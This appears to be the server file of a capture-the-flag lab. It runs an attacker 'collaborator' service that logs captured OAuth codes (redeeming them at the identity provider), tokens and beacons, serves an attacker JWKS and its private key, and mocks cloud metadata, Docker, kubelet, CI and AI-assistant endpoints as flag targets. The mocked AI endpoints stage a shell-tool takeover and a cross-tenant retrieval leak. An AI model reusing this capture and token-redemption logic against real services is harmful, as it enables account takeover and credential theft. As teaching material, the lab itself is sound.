'use strict';

const crypto = require('crypto');
const path = require('path');
const express = require('express');

const PORT = Number(process.env.PORT || 8081);
const IDP_BASE = process.env.IDP_BASE || 'http://idp:4000';
const CLIENT_ID = process.env.CLIENT_ID || 'aetherion-web';
const CLIENT_SECRET = process.env.CLIENT_SECRET || 'aetherion-web-public-9f3c';
const PUBLIC_APP = process.env.PUBLIC_APP || 'http://aetherion.local:8080';

const FLAGS = {
  oauth: process.env.FLAG_OAUTH || 'AETH{oauth_referer_chain_7a3f}',
  imds: process.env.FLAG_IMDS || 'AETH{imds_task_role_exfil_2f5a}',
  docker: process.env.FLAG_DOCKER || 'AETH{docker_socket_pivot_8c11}',
  kubelet: process.env.FLAG_KUBELET || 'AETH{kubelet_daemonset_pivot_4a6e}',
  envoy: process.env.FLAG_ENVOY || 'AETH{envoy_admin_spiffe_9c03}',
  ci: process.env.FLAG_CI || 'AETH{buildkit_cache_poison_e5d9}',
  containerd: process.env.FLAG_CONTAINERD || 'AETH{containerd_shim_socket_0a4f}',
  ai: process.env.FLAG_AI || 'AETH{agentic_tool_chain_c7b3}',
  prompt: process.env.FLAG_PROMPT || 'AETH{rag_tenant_leak_6f20}',
  xsleak: process.env.FLAG_XSLEAK || 'AETH{xsleak_coupon_oracle_c2f7}',
  webhookHmac: process.env.FLAG_WEBHOOK_HMAC || 'AETH{webhook_signature_bypass_5c3f}',
  s3: process.env.FLAG_S3 || 'AETH{s3_bucket_disclosure_c4a8}',
  k8sSecret: process.env.FLAG_K8S_SECRET || 'AETH{kubelet_secret_exfil_9d72}',
  userData: process.env.FLAG_USER_DATA || 'AETH{imds_userdata_sshkey_2a61}',
  ciToken: process.env.FLAG_CI_TOKEN || 'AETH{ci_runner_token_leak_7f04}',
  registry: process.env.FLAG_REGISTRY || 'AETH{registry_push_credential_5e93}',
  terraform: process.env.FLAG_TERRAFORM || 'AETH{terraform_state_secret_6d18}',
  assistantTool: process.env.FLAG_ASSISTANT_TOOL || 'AETH{assistant_tool_rce_3b7c}',
  hostPoison: process.env.FLAG_HOST_POISON || 'AETH{reset_host_injection_3f09}',
};

const IMDS_TOKEN = 'AQAAAAG-docker-proxy-task-token-7f3a';
const dashboardEvents = [];

const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});
const attackerJwk = crypto.createPublicKey(publicKey).export({ format: 'jwk' });
attackerJwk.kid = 'attacker-2026';
attackerJwk.use = 'sig';
attackerJwk.alg = 'RS256';

function escapeHtml(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function record(kind, data) {
  const item = {
    id: crypto.randomBytes(5).toString('hex'),
    kind,
    at: new Date().toISOString(),
    data,
  };
  dashboardEvents.unshift(item);
  if (dashboardEvents.length > 250) dashboardEvents.pop();
  console.log(`[capture] ${kind}`, JSON.stringify(data).slice(0, 400));
  return item;
}

function decodeJwtPayload(token) {
  try {
    return JSON.parse(Buffer.from(String(token).split('.')[1], 'base64url').toString('utf8'));
  } catch {
    return null;
  }
}

async function exchangeOauthCode(code, redirectUri) {
  const body = new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    redirect_uri: redirectUri,
  });
  const response = await fetch(`${IDP_BASE}/token`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body,
  });
  if (!response.ok) return null;
  const tokens = await response.json();
  return decodeJwtPayload(tokens.access_token);
}

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: false }));

app.get('/health', (_req, res) => res.json({ status: 'ok', service: 'aetherion-lab' }));

app.get('/jwks', (_req, res) => res.json({ keys: [attackerJwk] }));
app.get('/private-key', (_req, res) => res.type('application/x-pem-file').send(privateKey));
app.get('/jwks.json', (_req, res) => res.json({ keys: [attackerJwk] }));

app.get('/redirect', (req, res) => {
  const target = String(req.query.to || req.query.url || '');
  if (!/^https?:\/\//i.test(target)) return res.status(400).send('bad target');
  res.redirect(302, target);
});

app.get('/redirect307', (req, res) => {
  const target = String(req.query.to || req.query.url || '');
  if (!/^https?:\/\//i.test(target)) return res.status(400).send('bad target');
  res.redirect(307, target);
});

app.get('/capture', async (req, res) => {
  const referer = String(req.headers.referer || '');
  let flag = null;
  let code = null;
  let principal = null;
  try {
    if (referer.includes('code=')) {
      const callbackUrl = new URL(referer);
      code = callbackUrl.searchParams.get('code');
      callbackUrl.searchParams.delete('code');
      callbackUrl.searchParams.delete('state');
      const redirectUri = callbackUrl.toString();
      const claims = await exchangeOauthCode(code, redirectUri);
      principal = claims && (claims.email || claims.sub);
      if (claims && claims.role === 'admin') flag = FLAGS.oauth;
    }
  } catch (error) {
    console.log('[oauth] exchange failed', error.message);
  }
  const captured = record('oauth-referer', {
    referer,
    code,
    principal,
    flag,
  });
  const html = `<!doctype html><html><head><meta charset="utf-8"><title>Capture</title>
<style>body{background:#070b14;color:#dce6ff;font-family:ui-monospace,Menlo,monospace;padding:40px;line-height:1.5}.flag{color:#7dffb2}.box{border:1px solid #24304d;border-radius:14px;padding:24px;max-width:860px;background:#0c1322;white-space:pre-wrap;word-break:break-all}a{color:#8ea8ff}</style></head>
<body><div class="box">interaction logged.&#10;&#10;${escapeHtml(JSON.stringify(captured, null, 2))}${flag ? `\n\nflag: ${escapeHtml(flag)}` : ''}&#10;&#10;<a href="/">open collaborator dashboard</a></div></body></html>`;
  res.type('html').send(html);
});

app.get('/c', (req, res) => {
  record('beacon', { value: String(req.query.d || req.query.v || '').slice(0, 4000), ua: req.headers['user-agent'] });
  res.set('content-type', 'image/gif');
  res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.post('/capture', (req, res) => {
  const captured = record('manual', req.body || {});
  res.json({ ok: true, capture: captured });
});

app.post('/capture/token', (req, res) => {
  const token = String(req.body.token || '');
  const claims = decodeJwtPayload(token);
  const captured = record('postmessage-token', {
    token,
    claims,
    note: 'Use this token as Authorization: Bearer ... against the admin vault.',
  });
  res.json({ ok: true, capture: captured });
});

app.post('/capture/xsleak', (req, res) => {
  const value = String(req.body.value || '');
  const flag = value === FLAGS.xsleak ? FLAGS.xsleak : null;
  const captured = record('xsleak-result', { value, flag });
  res.json({ ok: true, matched: Boolean(flag), flag, capture: captured });
});

app.get('/captures', (_req, res) => {
  res.json({ captures: dashboardEvents });
});

app.get('/xsleaks', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'xsleaks.html'));
});

app.get('/livechat', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'livechat.html'));
});

app.get('/latest', (_req, res) => {
  record('imds', { path: '/latest' });
  res.type('text/plain').send('latest/\nmeta-data/\nuser-data/');
});

app.get('/latest/api/token', (_req, res) => {
  record('imds-token', { note: 'IMDSv2 token issued', target: 'aetherion-task' });
  res.type('text/plain').send(IMDS_TOKEN);
});

app.put('/latest/api/token', (_req, res) => {
  res.set('x-aws-ec2-metadata-token', IMDS_TOKEN);
  res.type('text/plain').send(IMDS_TOKEN);
});

app.get('/latest/meta-data/iam/security-credentials', (_req, res) => {
  record('imds', { credentialList: true });
  res.type('text/plain').send('aetherion-task');
});

app.get('/latest/meta-data/iam/security-credentials/aetherion-task', (req, res) => {
  record('imds-credentials', { headers: req.headers, flag: FLAGS.imds });
  res.json({
    Code: 'Success',
    LastUpdated: '2026-10-20T00:00:00Z',
    Type: 'AWS-HMAC',
    AccessKeyId: 'ASIA_AETHERION_LAB',
    SecretAccessKey: 'aetherion-lab-secret-key-not-real',
    Token: IMDS_TOKEN,
    Expiration: '2030-01-01T00:00:00Z',
    flag: FLAGS.imds,
  });
});

app.get('/latest/user-data', (_req, res) => {
  record('imds-userdata', { flag: FLAGS.userData });
  res.type('text/plain').send(`#cloud-bootstrap
export AETHERION_ROLE=commerce-edge
export AETHERION_DEPLOY_KEY=/run/secrets/deploy_key
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAetherionLabDeployKey ops@aetherion
# vault: ${FLAGS.userData}
`);
});

function dockerAuth(req) {
  const supplied =
    String(req.query.token || '') ||
    String(req.get('x-aws-token') || '') ||
    String(req.get('authorization') || '').replace(/^Bearer\s+/i, '');
  return supplied === IMDS_TOKEN;
}

function dockerCreate(req, res) {
  record('docker-api', { path: req.path, body: req.body, authorized: dockerAuth(req) });
  if (!dockerAuth(req)) return res.status(401).json({ message: 'authentication required' });
  const hostConfig = (req.body && req.body.HostConfig) || {};
  const binds = Array.isArray(hostConfig.Binds) ? hostConfig.Binds : [];
  const hostMount = binds.some((bind) => String(bind).includes(':/'));
  if (hostConfig.Privileged || hostMount) {
    return res.status(201).json({
      Id: `aetherion-${crypto.randomBytes(6).toString('hex')}`,
      Warnings: [],
      flag: FLAGS.docker,
      Message: 'container scheduled with host-backed mount',
    });
  }
  return res.status(201).json({ Id: `aetherion-${crypto.randomBytes(6).toString('hex')}`, Warnings: [] });
}

app.get(['/fake-docker/v1.43/containers/json', '/socket-proxy/v1.43/containers/json'], (req, res) => {
  record('docker-api', { path: req.path, list: true, authorized: dockerAuth(req) });
  if (!dockerAuth(req)) return res.status(401).json({ message: 'authentication required' });
  res.json([
    {
      Id: 'aetherion-edge',
      Names: ['/aetherion-edge'],
      Image: 'aetherion/edge:latest',
      State: 'running',
      Status: 'Up 2 hours',
    },
    {
      Id: 'aetherion-api',
      Names: ['/aetherion-api'],
      Image: 'aetherion/api:latest',
      State: 'running',
      Status: 'Up 2 hours',
    },
  ]);
});

app.post(['/fake-docker/v1.43/containers/create', '/socket-proxy/v1.43/containers/create'], dockerCreate);
app.post('/fake-docker/v1.43/images/..%2fcontainers/create', dockerCreate);
app.post('/socket-proxy/v1.43/images/..%2fcontainers/create', dockerCreate);

app.get('/fake-kubelet/pods', (req, res) => {
  record('kubelet', { path: req.path, flag: FLAGS.kubelet });
  res.json({
    kind: 'PodList',
    items: [
      {
        metadata: { name: 'aetherion-telemetry-agent', namespace: 'kube-system' },
        spec: { serviceAccountName: 'aetherion-daemonset', hostPID: true, hostNetwork: true },
      },
    ],
    flag: FLAGS.kubelet,
  });
});

app.get('/fake-kubelet/api/v1/namespaces/kube-system/secrets', (_req, res) => {
  res.json({ items: [{ metadata: { name: 'aetherion-daemonset-token' } }], flag: FLAGS.kubelet });
});

app.get('/fake-kubelet/api/v1/namespaces/kube-system/secrets/aetherion-daemonset-token', (req, res) => {
  record('kubelet-secret', { path: req.path, flag: FLAGS.k8sSecret });
  res.json({
    metadata: { name: 'aetherion-daemonset-token', namespace: 'kube-system' },
    data: { token: Buffer.from('aetherion-service-account-token').toString('base64') },
    flag: FLAGS.k8sSecret,
  });
});

app.get('/fake-s3/aetherion-backups', (req, res) => {
  record('s3-list', { path: req.path, query: req.query });
  res.type('application/xml').send(`<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>aetherion-backups</Name>
  <Prefix></Prefix>
  <KeyCount>2</KeyCount>
  <Contents><Key>db/aetherion-2026-10.sql.gz</Key><Size>481204</Size></Contents>
  <Contents><Key>db/wallet-ledger.csv</Key><Size>9214</Size></Contents>
</ListBucketResult>`);
});

app.get('/fake-s3/aetherion-backups/*', (req, res) => {
  record('s3-object', { key: req.params[0], flag: FLAGS.s3 });
  res.type('text/plain').send(`-- Aetherion production backup (lab)\nCREATE TABLE users (...);\nINSERT INTO vault VALUES ('${FLAGS.s3}');\n`);
});

app.get('/fake-ci/secrets', (req, res) => {
  record('ci-secrets', { path: req.path, flag: FLAGS.ciToken });
  res.json({
    pipeline: 'aetherion-production',
    runner: 'aetherion-build-07',
    variables: { REGISTRY_USER: 'ci-runner', REGISTRY_TOKEN: 'lab-not-real', DEPLOY_KEY: 'lab-not-real' },
    flag: FLAGS.ciToken,
  });
});

app.get('/fake-registry/catalog', (_req, res) => {
  record('registry-catalog', { flag: FLAGS.registry });
  res.json({
    registry: 'registry.aetherion.local',
    repositories: ['aetherion/edge', 'aetherion/api', 'aetherion/lab'],
    auth: { username: 'deploy-bot', token: 'lab-not-real' },
    flag: FLAGS.registry,
  });
});

app.get('/fake-terraform/state', (_req, res) => {
  record('terraform-state', { flag: FLAGS.terraform });
  res.json({
    version: 4,
    terraform_version: '1.9.5',
    outputs: {
      database_password: { value: 'lab-not-real', sensitive: true },
      edge_deploy_key: { value: 'lab-not-real', sensitive: true },
    },
    flag: FLAGS.terraform,
  });
});

app.get('/assistant/tool', (_req, res) => {
  res.json({
    tool: 'workspace-shell',
    description: 'Preview of the operations copilot tool schema. POST a tool call to execute it.',
    schema: { tool: 'shell', command: 'string' },
  });
});

app.post('/assistant/tool', (req, res) => {
  const tool = String((req.body && req.body.tool) || '');
  const command = String((req.body && req.body.command) || '');
  record('assistant-tool', { tool, command, flag: FLAGS.assistantTool });
  if (tool !== 'shell' || !command) {
    return res.status(400).json({ error: 'tool and command required' });
  }
  res.json({
    tool,
    command,
    stdout: command.includes('cat') || command.includes('printenv') ? FLAGS.assistantTool : 'command completed',
    exitCode: 0,
  });
});

app.post('/fake-hooks/secure', (req, res) => {
  record('webhook', { signature: req.get('x-aetherion-signature') || null, body: req.body, flag: FLAGS.webhookHmac });
  res.json({
    accepted: true,
    event: (req.body && req.body.event) || 'order.refunded',
    signature: 'not enforced on legacy receivers',
    flag: FLAGS.webhookHmac,
  });
});

app.post('/mail', (req, res) => {
  const host = String((req.body && req.body.host) || '');
  const flag = host.includes('attack.aetherion.local') || host.includes('127.0.0.1:18081') ? FLAGS.hostPoison : null;
  const captured = record('mail', {
    to: String((req.body && req.body.to) || ''),
    subject: String((req.body && req.body.subject) || ''),
    host,
    link: String((req.body && req.body.link) || ''),
    flag,
  });
  res.json({ queued: true, capture: captured });
});

app.get('/csrf', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'csrf.html'));
});

app.get('/cors', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'cors.html'));
});

app.get('/jsonp', (_req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'jsonp.html'));
});

app.get('/fake-envoy/config_dump', (req, res) => {
  record('envoy-admin', { path: req.path, flag: FLAGS.envoy });
  res.json({
    configs: [{ '@type': 'type.googleapis.com/envoy.admin.v3.ClustersConfigDump', version: '2026-10' }],
    spiffe: { trustDomain: 'aetherion.internal', identity: 'spiffe://aetherion.internal/ns/prod/sa/telemetry' },
    flag: FLAGS.envoy,
  });
});

app.get('/fake-envoy/certs', (_req, res) => {
  res.json({ certificates: [{ serial: '7f3a', ca: 'aetherion-mesh-ca' }], flag: FLAGS.envoy });
});

app.get('/fake-ci/webhooks', (_req, res) => {
  res.json({ pipeline: 'aetherion-production', cache: 'buildkit-shared', flag: FLAGS.ci });
});

app.post('/fake-ci/registry/retag', (req, res) => {
  record('ci-registry', { body: req.body });
  res.json({ tagged: true, manifest: 'sha256:aetherion', flag: FLAGS.ci });
});

app.get('/fake-containerd/socket', (_req, res) => {
  record('containerd', { flag: FLAGS.containerd });
  res.json({ socket: '@/containerd-shim/aetherion.sock', hostNetwork: true, flag: FLAGS.containerd });
});

app.get('/assistant/evidence', (_req, res) => {
  record('assistant-evidence', { flag: FLAGS.ai });
  res.json({ document: 'Q4-forecast.pdf', tenant: 'aetherion', flag: FLAGS.ai });
});

app.get('/assistant/vector/adjacent', (_req, res) => {
  record('rag-vector', { flag: FLAGS.prompt });
  res.json({
    chunks: [
      { tenant: 'northstar', text: 'restricted roadmap: project aurora', similarity: 0.93 },
      { tenant: 'aetherion', text: 'public FAQ', similarity: 0.87 },
    ],
    flag: FLAGS.prompt,
  });
});

app.get('/', (_req, res) => {
  const rows = dashboardEvents
    .map((item) => {
      const flagMatch = JSON.stringify(item.data).match(/AETH\{[^}]+\}/g);
      return `<tr><td>${escapeHtml(item.at)}</td><td><span class="kind">${escapeHtml(item.kind)}</span></td><td><pre>${escapeHtml(JSON.stringify(item.data, null, 2))}</pre>${flagMatch ? `<div class="flag">${escapeHtml(flagMatch.join(', '))}</div>` : ''}</td></tr>`;
    })
    .join('');
  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="5">
<title>Aetherion Collaborator</title><style>
:root{color-scheme:dark}body{margin:0;background:radial-gradient(circle at 10% 0,#152447,#05070e 45%);color:#dce6ff;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
header{padding:28px 34px;border-bottom:1px solid #202b45;display:flex;justify-content:space-between;align-items:center}
h1{font-size:16px;letter-spacing:.18em;font-weight:600;margin:0}.sub{color:#7183a8;font-size:12px}
main{padding:24px 34px}table{width:100%;border-collapse:collapse;font-size:12px}
td{border-top:1px solid #1b2439;padding:14px 10px;vertical-align:top;max-width:900px}
.kind{color:#9f8cff;border:1px solid #3b3266;padding:3px 7px;border-radius:20px;white-space:nowrap}
pre{margin:0;white-space:pre-wrap;word-break:break-all;color:#a9b9d8;line-height:1.45}
.flag{color:#72ffb1;margin-top:8px}td:first-child{color:#6e7f9f;white-space:nowrap;width:180px}
a{color:#8da9ff;text-decoration:none}.links{padding:10px 34px 30px;font-size:12px;color:#6e7f9f}
</style></head><body>
<header><div><h1>AETHERION / COLLABORATOR</h1><div class="sub">out-of-band interaction and credential capture</div></div><div class="sub">${dashboardEvents.length} events</div></header>
<main><table><tbody>${rows || '<tr><td colspan="3" style="color:#6e7f9f">No interactions yet.</td></tr>'}</tbody></table></main>
<div class="links">Attack pages: <a href="/xsleaks">/xsleaks</a> · <a href="/livechat">/livechat</a> · <a href="/csrf">/csrf</a> · <a href="/cors">/cors</a> · <a href="/jsonp">/jsonp</a> · <a href="/captures">/captures</a> · <a href="/jwks">/jwks</a> · <a href="/private-key">/private-key</a></div>
</body></html>`);
});

app.use((error, _req, res, _next) => {
  console.error('[lab]', error);
  res.status(500).json({ error: 'lab request failed' });
});

app.listen(PORT, '0.0.0.0', () => console.log(`Aetherion lab listening on ${PORT}`));
